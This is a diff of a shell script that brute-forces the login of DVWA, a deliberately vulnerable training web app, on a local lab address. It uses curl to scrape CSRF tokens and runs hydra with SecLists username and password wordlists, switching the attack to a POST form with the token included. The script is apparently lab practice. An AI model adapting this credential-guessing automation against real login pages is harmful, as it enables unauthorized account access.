@@ -10,8 +10,7 @@ CSRFSEC=$(curl -s -i -L -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F
 curl -s -i -L -b dvwa.cookie -c dvwa.cookie.medium -d $"security=medium&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
 #Check out the "bruteforce" page
 curl -s -i -L -b dvwa.cookie.medium -c dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/brute/ > vuln
+CSRFMED=$(cat vuln | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
 #Get new CSRF, Send our known login
-rm dvwa*
-rm vuln
 rm hydra.restore
-hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -Vv -u -F -w 10 -W 1 -V 192.168.178.98 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie: security=medium; PHPSESSID=${SESSIONID}"
+hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -d -u -F -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRFMED}:F=Content-Length\: 4945:H=Cookie: security=medium; PHPSESSID=${SESSIONID}"
